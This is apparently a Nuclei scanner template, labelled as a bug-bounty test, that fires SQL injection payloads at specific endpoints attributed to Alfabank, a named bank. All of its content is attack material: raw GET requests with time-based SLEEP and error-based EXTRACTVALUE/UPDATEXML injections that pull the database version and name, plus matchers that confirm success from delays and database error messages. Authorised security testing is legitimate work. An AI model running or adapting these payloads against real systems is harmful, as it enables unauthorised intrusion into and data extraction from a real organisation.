id: alfabank-sqli-test

info:
  name: Alfabank - SQL Injection Test
  author: bugbounty
  severity: critical
  description: Time-based and error-based SQL injection
  tags: sqli,alfabank
  reference:
    - https://portswigger.net/web-security/sql-injection

http:
  - raw:
      - |
        GET /company/view?company_id=1' AND (SELECT 1 FROM (SELECT(SLEEP(6)))a)-- HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml

      - |
        GET /order/view?order_id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml

      - |
        GET /about/tender/now/tender.html?id=1' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)-- HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers-condition: or
    matchers:
      - type: dsl
        name: time-based
        dsl:
          - 'duration>=6'
          - 'status_code == 200'
        condition: and

      - type: regex
        name: error-based
        part: body
        regex:
          - "XPATH syntax error: '~"
          - "You have an error in your SQL syntax"
          - "Warning: mysql_[a-z_]+\(\)"
          - "ORA-[0-9]{5}"
          - "PostgreSQL.*ERROR"
          - "Microsoft SQL Server.*error"
        condition: or
